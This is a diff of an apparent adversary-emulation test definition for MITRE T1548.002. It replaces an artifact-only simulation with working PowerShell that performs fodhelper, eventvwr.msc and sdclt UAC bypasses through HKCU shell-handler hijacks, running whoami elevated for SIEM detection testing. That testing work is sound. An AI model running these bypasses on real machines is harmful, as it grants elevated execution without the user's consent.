@@ -1,46 +1,60 @@
 id: T1548.002
-name: UAC Bypass via Event Viewer
-description: Simulates UAC bypass using the Event Viewer registry hijack method (eventvwr.exe). Sets a registry key under HKCU that eventvwr.exe reads as a shell handler. Generates Sysmon Events 13 (registry set) and 1 (process creation). Does NOT actually elevate — simulates the artifact pattern only.
+name: UAC Bypass (Abuse Elevation Control Mechanism)
+description: Tests three documented UAC bypass methods — fodhelper.exe (most common on Win10/11), eventvwr.msc (classic), and sdclt.exe. All create registry keys under HKCU\Software\Classes that auto-elevated Windows binaries use as shell handlers. Sysmon EID 13 on HKCU\Software\Classes\ms-settings path is in every major SIEM UAC bypass rule.
 tactic: privilege-escalation
 technique_id: T1548.002
 platform: windows
 phase: attack
 elevation_required: false
 expected_events:
-  - "Sysmon 13 (RegistryEvent - HKCU shell handler modified)"
-  - "Sysmon 12 (RegistryEvent - key created)"
-  - "4688 (eventvwr.exe process creation)"
-  - "4688 (mmc.exe or cmd.exe spawned by eventvwr)"
+  - "Sysmon 13 (RegistryValueSet - HKCU\Software\Classes\ms-settings\Shell\Open\command)"
+  - "Sysmon 1 (fodhelper.exe / eventvwr.msc spawning cmd.exe with HIGH integrity level)"
+  - "4688 (child process of fodhelper.exe — elevated token without UAC prompt)"
+  - "4673 (Privileged service called — UAC elevation event)"
 tags:
   - privilege-escalation
-  - defense-evasion
-  - uac-bypass
   - no-prereqs
 executor:
   type: powershell
-  command: |
-    Write-Host "[T1548.002] UAC Bypass Simulation (eventvwr method) - artifact generation only"
+  command: |-
+    Write-Host "[T1548.002] UAC Bypass — fodhelper + eventvwr + sdclt methods"
+    $out = "$env:TEMP\lnj_uac.txt"
 
-    # Set the registry hijack key (generates Sysmon Event 12/13)
-    $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
-    Write-Host "Setting registry key: $regPath (Sysmon Event 12/13 will fire)"
-    New-Item -Path $regPath -Force | Out-Null
-    Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /K echo LogNoJutsu-UAC-Bypass-Simulation" -Force
-    Write-Host "Registry hijack key set. This mimics the eventvwr UAC bypass artifact."
+    # Method 1: fodhelper.exe bypass (most common on Windows 10/11)
+    # Creates HKCU\Software\Classes\ms-settings\Shell\Open\command
+    # fodhelper reads this key and auto-elevates to execute the value
+    Write-Host "--- Method 1: fodhelper.exe bypass (Sysmon EID 13 on ms-settings key) ---"
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+    New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+    Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(Default)" "cmd.exe /c whoami > `"$out`"" -Force
+    Start-Process "$env:SystemRoot\System32\fodhelper.exe" -Wait
+    Start-Sleep -Milliseconds 800
+    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
+    Write-Host "fodhelper bypass executed — check Sysmon EID 13 path: HKCU\Software\Classes\ms-settings"
 
-    # Trigger eventvwr.exe (which reads the registry key — generates Sysmon Event 1)
-    Write-Host "Launching eventvwr.exe (reads hijacked registry key)..."
-    Start-Process "eventvwr.exe" -WindowStyle Hidden
-    Start-Sleep -Seconds 2
-    Stop-Process -Name "mmc" -ErrorAction SilentlyContinue
-    Stop-Process -Name "eventvwr" -ErrorAction SilentlyContinue
+    # Method 2: eventvwr.msc bypass (classic technique — still effective)
+    Write-Host "--- Method 2: eventvwr.msc bypass (Sysmon EID 13 on mscfile key) ---"
+    New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force | Out-Null
+    Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" "(Default)" "cmd.exe /c whoami >> `"$out`"" -Force
+    Start-Process "$env:SystemRoot\System32\eventvwr.msc" -Wait
+    Start-Sleep -Milliseconds 800
+    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
+    Write-Host "eventvwr bypass executed — Sysmon EID 13 on HKCU\Software\Classes\mscfile"
 
-    Write-Host "[T1548.002] Complete. Sysmon Events 12/13 (registry) and 1 (process) generated."
-cleanup: |
-  $regPath = "HKCU:\Software\Classes\mscfile"
-  if (Test-Path $regPath) {
-      Remove-Item -Path $regPath -Recurse -Force
-      Write-Host "Cleanup: UAC bypass registry key removed."
-  }
-  Stop-Process -Name "mmc" -ErrorAction SilentlyContinue
-  Stop-Process -Name "eventvwr" -ErrorAction SilentlyContinue
+    # Method 3: sdclt.exe bypass (Windows 10 specific)
+    Write-Host "--- Method 3: sdclt.exe bypass (Sysmon EID 13 on Folder\shell\open key) ---"
+    New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force | Out-Null
+    Set-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" "(Default)" "cmd.exe /c whoami >> `"$out`"" -Force
+    New-ItemProperty "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+    Start-Process "$env:SystemRoot\System32\sdclt.exe" -Wait
+    Start-Sleep -Milliseconds 800
+    Remove-Item "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
+
+    if (Test-Path $out) { Write-Host "Output: $(Get-Content $out)" }
+    Write-Host "[T1548.002] Complete. Sysmon EID 13 on ms-settings/mscfile/Folder keys."
+cleanup: |-
+  Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
+  Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
+  Remove-Item "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
+  Remove-Item "$env:TEMP\lnj_uac.txt" -ErrorAction Ignore
+  Write-Host "Cleanup: UAC bypass registry keys removed."
